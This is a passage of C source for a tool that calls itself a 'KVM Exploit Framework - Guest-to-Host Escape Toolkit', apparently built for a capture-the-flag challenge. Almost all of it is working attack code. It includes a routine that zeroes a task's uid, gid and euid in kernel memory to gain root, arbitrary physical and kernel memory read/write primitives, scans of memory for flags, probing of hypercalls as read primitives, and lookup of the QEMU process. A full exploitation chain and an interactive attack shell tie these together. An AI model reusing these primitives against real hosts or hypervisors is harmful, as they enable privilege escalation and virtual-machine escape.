    unsigned long init_task = lookup_symbol("init_task");
    unsigned long task = init_task;
    unsigned long next_task;
    unsigned long tasks_offset = 0x468;
    char comm[17] = {0};
    int count = 0;

    if (!init_task) return 0;

    do {
        if (read_kernel_mem(task + TASK_STRUCT_COMM_OFFSET, comm, 16) == 0) {
            comm[16] = '\0';
            if (strstr(comm, name) != NULL) {
                LOG_SUCCESS("Found process '%s' at 0x%lx", comm, task);
                return task;
            }
        }

        if (read_kernel_mem(task + tasks_offset, &next_task, sizeof(next_task)) < 0) {
            break;
        }
        task = next_task - tasks_offset;
        count++;

    } while (task != init_task && task != 0 && count < 10000);

    return 0;
}

/* Find QEMU process */
unsigned long find_qemu_process(void)
{
    unsigned long task;

    task = find_process_by_name("qemu");
    if (task) return task;

    task = find_process_by_name("kvm");
    if (task) return task;

    return 0;
}

/* ============================================================================
 * Credential Manipulation
 * ============================================================================ */

struct cred_info {
    unsigned long cred_addr;
    uint32_t uid, gid, suid, sgid;
    uint32_t euid, egid, fsuid, fsgid;
};

int read_task_creds(unsigned long task_addr, struct cred_info *creds)
{
    unsigned long cred_ptr;

    /* Read the cred pointer */
    if (read_kernel_mem(task_addr + TASK_STRUCT_CRED_OFFSET, &cred_ptr, sizeof(cred_ptr)) < 0) {
        return -1;
    }

    creds->cred_addr = cred_ptr;

    /* Read credential values */
    if (read_kernel_mem(cred_ptr + CRED_UID_OFFSET, &creds->uid, sizeof(uint32_t)) < 0) {
        return -1;
    }
    if (read_kernel_mem(cred_ptr + CRED_GID_OFFSET, &creds->gid, sizeof(uint32_t)) < 0) {
        return -1;
    }
    if (read_kernel_mem(cred_ptr + CRED_EUID_OFFSET, &creds->euid, sizeof(uint32_t)) < 0) {
        return -1;
    }

    return 0;
}

int escalate_privileges(unsigned long task_addr)
{
    unsigned long cred_ptr;
    uint32_t zero = 0;

    LOG_WARN("Attempting privilege escalation on task 0x%lx", task_addr);

    /* Read the cred pointer */
    if (read_kernel_mem(task_addr + TASK_STRUCT_CRED_OFFSET, &cred_ptr, sizeof(cred_ptr)) < 0) {
        LOG_ERROR("Failed to read cred pointer");
        return -1;
    }

    LOG_INFO("cred struct at 0x%lx", cred_ptr);

    /* Zero out uid, gid, euid, egid (make root) */
    if (write_kernel_mem(cred_ptr + CRED_UID_OFFSET, &zero, sizeof(zero), 1) < 0) {
        LOG_ERROR("Failed to write uid");
        return -1;
    }

    if (write_kernel_mem(cred_ptr + CRED_GID_OFFSET, &zero, sizeof(zero), 1) < 0) {
        LOG_ERROR("Failed to write gid");
        return -1;
    }

    if (write_kernel_mem(cred_ptr + CRED_EUID_OFFSET, &zero, sizeof(zero), 1) < 0) {
        LOG_ERROR("Failed to write euid");
        return -1;
    }

    LOG_SUCCESS("Credentials modified - process should now have root privileges");
    return 0;
}

/* ============================================================================
 * Memory Scanning
 * ============================================================================ */

/* Scan physical memory for a pattern */
int scan_physical_for_pattern(unsigned long start, unsigned long end, 
                               const void *pattern, size_t pattern_len,
                               void (*callback)(unsigned long addr))
{
    unsigned char *buf;
    size_t chunk_size = SCAN_CHUNK_SIZE;
    int found = 0;

    buf = malloc(chunk_size);
    if (!buf) return -1;

    LOG_INFO("Scanning physical memory 0x%lx - 0x%lx for pattern...", start, end);

    for (unsigned long addr = start; addr < end; addr += chunk_size) {
        size_t read_size = (addr + chunk_size > end) ? (end - addr) : chunk_size;

        if (read_physical_mem(addr, buf, read_size) < 0) {
            continue;
        }

        /* Search for pattern in this chunk */
        for (size_t i = 0; i <= read_size - pattern_len; i++) {
            if (memcmp(buf + i, pattern, pattern_len) == 0) {
                if (callback) {
                    callback(addr + i);
                }
                found++;
            }
        }

        /* Progress indicator */
        if (!g_quiet && ((addr - start) % (64 * 1024 * 1024) == 0)) {
            printf("\r  Progress: %lu MB scanned, %d found...", 
                   (addr - start) / (1024 * 1024), found);
            fflush(stdout);
        }
    }

    if (!g_quiet) printf("\n");

    free(buf);
    return found;
}

/* Scan kernel memory for pattern */
int scan_kernel_for_pattern(unsigned long start, unsigned long end,
                            const void *pattern, size_t pattern_len,
                            void (*callback)(unsigned long addr))
{
    unsigned char *buf;
    size_t chunk_size = PAGE_SIZE * 16;  /* 64KB chunks for kernel */
    int found = 0;

    buf = malloc(chunk_size);
    if (!buf) return -1;

    LOG_INFO("Scanning kernel memory 0x%lx - 0x%lx for pattern...", start, end);

    for (unsigned long addr = start; addr < end; addr += chunk_size) {
        size_t read_size = (addr + chunk_size > end) ? (end - addr) : chunk_size;

        if (read_kernel_mem(addr, buf, read_size) < 0) {
            continue;
        }

        for (size_t i = 0; i <= read_size - pattern_len; i++) {
            if (memcmp(buf + i, pattern, pattern_len) == 0) {
                if (callback) {
                    callback(addr + i);
                }
                found++;
            }
        }
    }

    free(buf);
    return found;
}

/* Callback to record found addresses */
static void record_found_addr(unsigned long addr)
{
    char desc[256];
    snprintf(desc, sizeof(desc), "Pattern match");
    add_finding(addr, desc);
    if (!g_quiet) {
        printf("  Found at: 0x%lx\n", addr);
    }
}

/* ============================================================================
 * Flag Hunting (CTF Specific)
 * ============================================================================ */

static void flag_found_callback(unsigned long addr)
{
    unsigned char context[128];
    
    /* Read context around the flag */
    if (read_physical_mem(addr - 16, context, sizeof(context)) == 0) {
        printf(C_GREEN C_BOLD "\n[FLAG CANDIDATE] " C_RESET "at physical address 0x%lx:\n", addr);
        hexdump(context, sizeof(context), addr - 16);
        
        /* Try to extract printable string */
        printf("String: ");
        for (int i = 16; i < 112 && context[i] >= 0x20 && context[i] < 0x7f; i++) {
            printf("%c", context[i]);
        }
        printf("\n\n");
    }
    
    add_finding(addr, "FLAG candidate");
}

int hunt_flags_physical(unsigned long start, unsigned long size)
{
    int total_found = 0;

    printf("\n" C_BOLD "=== Flag Hunting (Physical Memory) ===" C_RESET "\n\n");
    printf("Scanning 0x%lx - 0x%lx (%lu MB)\n\n", start, start + size, size / (1024*1024));

    for (int i = 0; FLAG_PATTERNS[i] != NULL; i++) {
        LOG_INFO("Searching for pattern: %s", FLAG_PATTERNS[i]);
        int found = scan_physical_for_pattern(start, start + size, 
                                               FLAG_PATTERNS[i], 
                                               strlen(FLAG_PATTERNS[i]),
                                               flag_found_callback);
        total_found += found;
    }

    printf("\nTotal flag candidates found: %d\n", total_found);
    return total_found;
}

int hunt_flags_kernel(void)
{
    int total_found = 0;

    init_sysinfo();

    printf("\n" C_BOLD "=== Flag Hunting (Kernel Memory) ===" C_RESET "\n\n");

    unsigned long start = g_sysinfo.kaslr.kernel_base;
    unsigned long end = start + 0x10000000;  /* 256MB of kernel space */

    for (int i = 0; FLAG_PATTERNS[i] != NULL; i++) {
        LOG_INFO("Searching for pattern: %s", FLAG_PATTERNS[i]);
        int found = scan_kernel_for_pattern(start, end,
                                            FLAG_PATTERNS[i],
                                            strlen(FLAG_PATTERNS[i]),
                                            flag_found_callback);
        total_found += found;
    }

    printf("\nTotal flag candidates found: %d\n", total_found);
    return total_found;
}

/* Hunt in specific target address */
int hunt_at_address(unsigned long target_addr)
{
    unsigned char buf[4096];

    printf("\n" C_BOLD "=== Examining Target Address ===" C_RESET "\n\n");
    printf("Target: 0x%lx\n\n", target_addr);

    /* Try reading as physical memory */
    if (read_physical_mem(target_addr, buf, sizeof(buf)) == 0) {
        printf("Physical memory read successful:\n");
        hexdump(buf, 256, target_addr);

        /* Look for flags */
        for (size_t i = 0; i < sizeof(buf) - 8; i++) {
            for (int p = 0; FLAG_PATTERNS[p]; p++) {
                if (memcmp(buf + i, FLAG_PATTERNS[p], strlen(FLAG_PATTERNS[p])) == 0) {
                    printf(C_GREEN "\nFLAG FOUND at offset +0x%lx!\n" C_RESET, i);
                    hexdump(buf + i, 64, target_addr + i);
                }
            }
        }
    }

    /* Try reading as kernel memory */
    if (read_kernel_mem(target_addr, buf, sizeof(buf)) == 0) {
        printf("\nKernel memory read successful:\n");
        hexdump(buf, 256, target_addr);
    }

    return 0;
}

/* ============================================================================
 * CTF Hypercall Flag Extraction
 * ============================================================================ */

int extract_flag_via_hypercalls(void)
{
    struct hypercall_batch_request batch;
    uint64_t result;
    unsigned char flag_buf[256] = {0};
    int flag_len = 0;

    printf("\n" C_BOLD "=== CTF Flag Extraction via Hypercalls ===" C_RESET "\n\n");

    /* Try batch hypercalls first */
    LOG_INFO("Trying batch hypercalls 100-103...");
    if (hypercall_batch(&batch) == 0) {
        printf("HC 100: 0x%016lx\n", batch.r100);
        printf("HC 101: 0x%016lx\n", batch.r101);
        printf("HC 102: 0x%016lx\n", batch.r102);
        printf("HC 103: 0x%016lx\n", batch.r103);

        /* Check if any result looks like ASCII */
        uint64_t *results[] = {&batch.r100, &batch.r101, &batch.r102, &batch.r103};
        for (int i = 0; i < 4; i++) {
            unsigned char *bytes = (unsigned char *)results[i];
            int printable = 1;
            for (int j = 0; j < 8 && bytes[j]; j++) {
                if (bytes[j] != 0 && (bytes[j] < 0x20 || bytes[j] > 0x7e)) {
                    printable = 0;
                    break;
                }
            }
            if (printable && bytes[0]) {
                memcpy(flag_buf + flag_len, bytes, 8);
                flag_len += 8;
            }
        }
    }

    /* Try hypercall with offsets (for fragmented flags) */
    LOG_INFO("Trying hypercalls with offsets...");
    for (int offset = 0; offset < 64; offset += 8) {
        result = do_hypercall(100, offset, 0, 0, 0);
        if (result != (uint64_t)-1 && result != 0) {
            printf("HC 100 (offset %d): 0x%016lx", offset, result);
            
            /* Check if printable */
            unsigned char *bytes = (unsigned char *)&result;
            int printable = 1;
            for (int j = 0; j < 8 && bytes[j]; j++) {
                if (bytes[j] != 0 && (bytes[j] < 0x20 || bytes[j] > 0x7e)) {
                    printable = 0;
                    break;
                }
            }
            if (printable && bytes[0]) {
                printf(" -> \"%.8s\"", bytes);
            }
            printf("\n");
        }
    }

    /* Try reading via HC 102 (often a read primitive) */
    LOG_INFO("Trying HC 102 as read primitive...");
    for (int offset = -32; offset <= 32; offset += 8) {
        result = do_hypercall(102, (uint64_t)offset, 0, 0, 0);
        if (result != (uint64_t)-1 && result != 0) {
            printf("HC 102 (offset %d): 0x%016lx\n", offset, result);
        }
    }

    if (flag_len > 0) {
        flag_buf[flag_len] = '\0';
        printf(C_GREEN "\nExtracted data: %s\n" C_RESET, flag_buf);
    }

    return 0;
}

/* ============================================================================
 * EPT/NPT Analysis
 * ============================================================================ */

int analyze_ept(void)
{
    uint64_t eptp_msr;
    struct ept_walk_request walk;

    printf("\n" C_BOLD "=== EPT/NPT Analysis ===" C_RESET "\n\n");

    /* Try to read EPTP from MSR (VMX_EPT_POINTER = 0x201A on some systems) */
    /* Note: This may not work directly from guest */
    
    /* Try walking EPT for common guest physical addresses */
    unsigned long test_gpas[] = {
        0x0,           /* IVT */
        0x1000,        /* First page */
        0x100000,      /* 1MB mark */
        0x7c00,        /* Bootloader */
        0xfee00000,    /* LAPIC */
        0
    };

    for (int i = 0; test_gpas[i] || i == 0; i++) {
        memset(&walk, 0, sizeof(walk));
        if (walk_ept(0, test_gpas[i], &walk) == 0 && walk.hpa != 0) {
            printf("GPA 0x%08lx -> HPA 0x%08lx (page size: %d)\n",
                   test_gpas[i], walk.hpa, walk.page_size);
            printf("  PML4E: 0x%lx, PDPTE: 0x%lx, PDE: 0x%lx, PTE: 0x%lx\n",
                   walk.pml4e, walk.pdpte, walk.pde, walk.pte);
        }
    }

    return 0;
}

/* ============================================================================
 * QEMU Escape Helpers
 * ============================================================================ */

int analyze_qemu(void)
{
    unsigned long qemu_task;
    struct cred_info creds;

    printf("\n" C_BOLD "=== QEMU Process Analysis ===" C_RESET "\n\n");

    qemu_task = find_qemu_process();
    if (!qemu_task) {
        LOG_WARN("QEMU process not found in task list");
        return -1;
    }

    LOG_SUCCESS("Found QEMU process at 0x%lx", qemu_task);

    /* Read its credentials */
    if (read_task_creds(qemu_task, &creds) == 0) {
        printf("QEMU Credentials:\n");
        printf("  cred struct: 0x%lx\n", creds.cred_addr);
        printf("  uid: %d, gid: %d\n", creds.uid, creds.gid);
        printf("  euid: %d\n", creds.euid);
    }

    /* Try to find QEMU's memory mappings */
    /* This would involve reading mm_struct and walking VMAs */

    return 0;
}

/* ============================================================================
 * Arbitrary Read/Write Testing
 * ============================================================================ */

int test_arbitrary_rw(void)
{
    unsigned char test_pattern[] = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};
    unsigned char read_buf[8];
    unsigned long test_addr;

    printf("\n" C_BOLD "=== Arbitrary Read/Write Test ===" C_RESET "\n\n");

    init_sysinfo();

    /* Test physical memory R/W */
    test_addr = 0x10000;  /* Safe test address */
    
    LOG_INFO("Testing physical memory R/W at 0x%lx", test_addr);
    
    /* Read original */
    if (read_physical_mem(test_addr, read_buf, 8) == 0) {
        printf("Original: ");
        for (int i = 0; i < 8; i++) printf("%02x ", read_buf[i]);
        printf("\n");

        /* Write test pattern */
        if (write_physical_mem(test_addr, test_pattern, 8, 0) == 0) {
            /* Read back */
            if (read_physical_mem(test_addr, read_buf, 8) == 0) {
                printf("After write: ");
                for (int i = 0; i < 8; i++) printf("%02x ", read_buf[i]);
                printf("\n");

                if (memcmp(read_buf, test_pattern, 8) == 0) {
                    LOG_SUCCESS("Physical memory write verified!");
                } else {
                    LOG_WARN("Physical memory write may have failed");
                }
            }
        }
    }

    /* Test kernel memory R/W */
    if (g_sysinfo.kaslr.kernel_base) {
        test_addr = g_sysinfo.kaslr.kernel_base + 0x1000000;  /* data section */
        
        LOG_INFO("Testing kernel memory read at 0x%lx", test_addr);
        
        if (read_kernel_mem(test_addr, read_buf, 8) == 0) {
            printf("Kernel memory: ");
            for (int i = 0; i < 8; i++) printf("%02x ", read_buf[i]);
            printf("\n");
            LOG_SUCCESS("Kernel memory read works!");
        }
    }

    return 0;
}

/* ============================================================================
 * Full Exploitation Chain
 * ============================================================================ */

int run_full_exploit(unsigned long target_addr)
{
    printf("\n" C_BOLD C_RED "=== Full Exploitation Chain ===" C_RESET "\n\n");

    /* Step 1: Gather system info */
    LOG_INFO("Step 1: Gathering system information...");
    print_sysinfo();

    /* Step 2: Test our primitives */
    LOG_INFO("Step 2: Verifying read/write primitives...");
    test_arbitrary_rw();

    /* Step 3: Try hypercall-based flag extraction */
    LOG_INFO("Step 3: Attempting hypercall-based flag extraction...");
    extract_flag_via_hypercalls();

    /* Step 4: If target address provided, examine it */
    if (target_addr) {
        LOG_INFO("Step 4: Examining target address 0x%lx...", target_addr);
        hunt_at_address(target_addr);
    }

    /* Step 5: Hunt for flags in physical memory */
    LOG_INFO("Step 5: Scanning for flags in physical memory...");
    hunt_flags_physical(0, 256 * 1024 * 1024);  /* First 256MB */

    /* Step 6: Analyze QEMU if found */
    LOG_INFO("Step 6: Analyzing QEMU process...");
    analyze_qemu();

    printf("\n" C_BOLD "=== Exploitation Complete ===" C_RESET "\n");
    printf("Findings: %d items recorded\n", g_findings.count);

    for (int i = 0; i < g_findings.count && i < 20; i++) {
        printf("  [%d] 0x%lx - %s\n", i, g_findings.addresses[i], g_findings.descriptions[i]);
    }

    return 0;
}

/* ============================================================================
 * Interactive Shell
 * ============================================================================ */

void interactive_shell(void)
{
    char line[1024];
    char *cmd, *arg1, *arg2, *arg3;

    printf("\n" C_BOLD "KVM Exploit Framework - Interactive Shell" C_RESET "\n");
    printf("Type 'help' for commands, 'quit' to exit\n\n");

    while (1) {
        printf(C_CYAN "kvm> " C_RESET);
        fflush(stdout);

        if (!fgets(line, sizeof(line), stdin)) break;

        /* Remove newline */
        line[strcspn(line, "\n")] = 0;

        /* Parse command */
        cmd = strtok(line, " ");
        if (!cmd) continue;

        arg1 = strtok(NULL, " ");
        arg2 = strtok(NULL, " ");
        arg3 = strtok(NULL, " ");

        if (strcmp(cmd, "quit") == 0 || strcmp(cmd, "exit") == 0) {
            break;
        }
        else if (strcmp(cmd, "help") == 0) {
            printf("Commands:\n");
            printf("  sysinfo              - Show system information\n");
            printf("  procs                - List processes\n");
            printf("  find <name>          - Find process by name\n");
            printf("  read_phys <addr> <len> - Read physical memory\n");
            printf("  read_kern <addr> <len> - Read kernel memory\n");
            printf("  write_phys <addr> <val> - Write to physical memory\n");
            printf("  lookup <symbol>      - Look up kernel symbol\n");
            printf("  hypercall <nr> [args] - Execute hypercall\n");
            printf("  hc_batch             - Execute CTF hypercalls 100-103\n");
            printf("  hunt_phys <start> <size> - Hunt for flags in physical memory\n");
            printf("  hunt_kern            - Hunt for flags in kernel memory\n");
            printf("  examine <addr>       - Examine address for flags\n");
            printf("  ept_walk <gpa>       - Walk EPT for GPA\n");
            printf("  qemu                 - Analyze QEMU process\n");
            printf("  exploit [addr]       - Run full exploit chain\n");
            printf("  test_rw              - Test read/write primitives\n");
            printf("  quit                 - Exit\n");
        }
        else if (strcmp(cmd, "sysinfo") == 0) {
            print_sysinfo();
        }
        else if (strcmp(cmd, "procs") == 0) {
            list_processes();
        }
        else if (strcmp(cmd, "find") == 0 && arg1) {
            unsigned long task = find_process_by_name(arg1);
            if (task) {
                printf("Process '%s' found at 0x%lx\n", arg1, task);
            } else {
                printf("Process '%s' not found\n", arg1);
            }
        }
        else if (strcmp(cmd, "read_phys") == 0 && arg1) {
            unsigned long addr = strtoull(arg1, NULL, 0);
            size_t len = arg2 ? strtoul(arg2, NULL, 0) : 64;
            unsigned char *buf = malloc(len);
            if (buf && read_physical_mem(addr, buf, len) == 0) {
                hexdump(buf, len, addr);
            }
            free(buf);
        }
        else if (strcmp(cmd, "read_kern") == 0 && arg1) {
            unsigned long addr = strtoull(arg1, NULL, 0);
            size_t len = arg2 ? strtoul(arg2, NULL, 0) : 64;
            unsigned char *buf = malloc(len);
            if (buf && read_kernel_mem(addr, buf, len) == 0) {
                hexdump(buf, len, addr);
            }
            free(buf);
        }
        else if (strcmp(cmd, "write_phys") == 0 && arg1 && arg2) {
            unsigned long addr = strtoull(arg1, NULL, 0);
            unsigned long val = strtoull(arg2, NULL, 0);
            if (write_physical_mem(addr, &val, 8, 0) == 0) {
                printf("Wrote 0x%lx to physical address 0x%lx\n", val, addr);
            }
        }
        else if (strcmp(cmd, "lookup") == 0 && arg1) {
            unsigned long addr = lookup_symbol(arg1);
            printf("%s = 0x%lx\n", arg1, addr);
        }
        else if (strcmp(cmd, "hypercall") == 0 && arg1) {
            uint64_t nr = strtoull(arg1, NULL, 0);
            uint64_t a0 = arg2 ? strtoull(arg2, NULL, 0) : 0;
            uint64_t a1 = arg3 ? strtoull(arg3, NULL, 0) : 0;
            uint64_t result = do_hypercall(nr, a0, a1, 0, 0);
            printf("Hypercall %lu result: 0x%lx (%ld)\n", nr, result, (long)result);
        }
        else if (strcmp(cmd, "hc_batch") == 0) {
            struct hypercall_batch_request batch;
            if (hypercall_batch(&batch) == 0) {
                printf("HC 100: 0x%lx\n", batch.r100);
                printf("HC 101: 0x%lx\n", batch.r101);
                printf("HC 102: 0x%lx\n", batch.r102);
                printf("HC 103: 0x%lx\n", batch.r103);
            }
        }
        else if (strcmp(cmd, "hunt_phys") == 0) {
            unsigned long start = arg1 ? strtoull(arg1, NULL, 0) : 0;
            unsigned long size = arg2 ? strtoull(arg2, NULL, 0) : 64*1024*1024;
            hunt_flags_physical(start, size);
        }
        else if (strcmp(cmd, "hunt_kern") == 0) {
            hunt_flags_kernel();
        }
        else if (strcmp(cmd, "examine") == 0 && arg1) {
            unsigned long addr = strtoull(arg1, NULL, 0);
            hunt_at_address(addr);
        }
        else if (strcmp(cmd, "ept_walk") == 0 && arg1) {
            unsigned long gpa = strtoull(arg1, NULL, 0);
            struct ept_walk_request walk;
            memset(&walk, 0, sizeof(walk));
            if (walk_ept(0, gpa, &walk) == 0) {
                printf("GPA 0x%lx -> HPA 0x%lx\n", gpa, walk.hpa);
            }
        }
        else if (strcmp(cmd, "qemu") == 0) {
            analyze_qemu();
        }
        else if (strcmp(cmd, "exploit") == 0) {
            unsigned long addr = arg1 ? strtoull(arg1, NULL, 0) : 0;
            run_full_exploit(addr);
        }
        else if (strcmp(cmd, "test_rw") == 0) {
            test_arbitrary_rw();
        }
        else {
            printf("Unknown command: %s (type 'help' for commands)\n", cmd);
        }
    }

    printf("Goodbye!\n");
}

/* ============================================================================
 * Main Program
 * ============================================================================ */

void print_usage(const char *prog)
{
    printf("KVM Exploit Framework - Guest-to-Host Escape Toolkit\n\n");
    printf("Usage: %s [options] <command> [args]\n\n", prog);
    printf("Commands:\n");
    printf("  shell                 - Interactive shell\n");
    printf("  sysinfo               - Show system information\n");
    printf("  procs                 - List processes\n");
    printf("  symbols               - Dump important symbols\n");
    printf("  hunt_phys <start> <size> - Hunt flags in physical memory\n");
    printf("  hunt_kern             - Hunt flags in kernel memory\n");
    printf("  hunt_addr <addr>      - Examine specific address\n");
    printf("  hypercalls            - Extract flags via hypercalls\n");
    printf("  qemu                  - Analyze QEMU process\n");
    printf("  ept                   - Analyze EPT/NPT\n");
    printf("  test_rw               - Test read/write primitives\n");
    printf("  exploit [addr]        - Run full exploitation chain\n");
    printf("\n");
    printf("Options:\n");
    printf("  -v, --verbose         - Verbose output\n");
    printf("  -q, --quiet           - Quiet mode\n");
    printf("  -h, --help            - Show this help\n");
    printf("\n");
}

int main(int argc, char *argv[])
{
    int opt;
    static struct option long_opts[] = {
        {"verbose", no_argument, 0, 'v'},
        {"quiet", no_argument, 0, 'q'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "vqh", long_opts, NULL)) != -1) {
        switch (opt) {
            case 'v': g_verbose = 1; break;
            case 'q': g_quiet = 1; break;
            case 'h': print_usage(argv[0]); return 0;
            default: print_usage(argv[0]); return 1;
        }
    }

    if (optind >= argc) {
        /* Default to interactive shell */
        interactive_shell();
        close_device();
        return 0;
    }

    const char *cmd = argv[optind];

    if (strcmp(cmd, "shell") == 0) {
        interactive_shell();
    }
    else if (strcmp(cmd, "sysinfo") == 0) {
        print_sysinfo();
    }
    else if (strcmp(cmd, "procs") == 0) {
        list_processes();
    }
    else if (strcmp(cmd, "symbols") == 0) {
        const char *syms[] = {
            "init_task", "current_task", "prepare_kernel_cred", "commit_creds",
            "kvm_vcpu_read_guest", "kvm_vcpu_write_guest", "vmx_vcpu_run",
            "svm_vcpu_run", "handle_ept_violation", "kvm_mmu_page_fault",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            unsigned long addr = lookup_symbol(syms[i]);
            printf("%-30s = 0x%lx\n", syms[i], addr);
        }
    }
    else if (strcmp(cmd, "hunt_phys") == 0) {
        unsigned long start = (optind + 1 < argc) ? strtoull(argv[optind + 1], NULL, 0) : 0;
        unsigned long size = (optind + 2 < argc) ? strtoull(argv[optind + 2], NULL, 0) : 256*1024*1024;
        hunt_flags_physical(start, size);
    }
    else if (strcmp(cmd, "hunt_kern") == 0) {
        hunt_flags_kernel();
    }
    else if (strcmp(cmd, "hunt_addr") == 0 && optind + 1 < argc) {
        unsigned long addr = strtoull(argv[optind + 1], NULL, 0);
        hunt_at_address(addr);
    }
    else if (strcmp(cmd, "hypercalls") == 0) {
        extract_flag_via_hypercalls();
    }
    else if (strcmp(cmd, "qemu") == 0) {
        analyze_qemu();
    }
    else if (strcmp(cmd, "ept") == 0) {
        analyze_ept();
    }
    else if (strcmp(cmd, "test_rw") == 0) {
        test_arbitrary_rw();
    }
    else if (strcmp(cmd, "exploit") == 0) {
        unsigned long addr = (optind + 1 < argc) ? strtoull(argv[optind + 1], NULL, 0) : 0;
        run_full_exploit(addr);
    }
    else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        print_usage(argv[0]);
        close_device();
        return 1;
    }

    close_device();
    return 0;
}